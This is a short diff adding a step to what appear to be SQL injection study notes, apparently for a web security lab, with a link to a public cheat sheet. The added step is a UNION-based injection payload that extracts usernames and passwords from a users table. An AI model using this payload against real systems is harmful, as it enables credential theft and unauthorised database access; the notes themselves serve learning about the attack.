@@ -69,4 +69,9 @@ STEP 3 - To find useful data from useful columns
 
 STEP 4 - To find multiple values from a column
 
+```sql
+' UNION SELECT username || '~' || password FROM users--
+```
+
+[Cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 
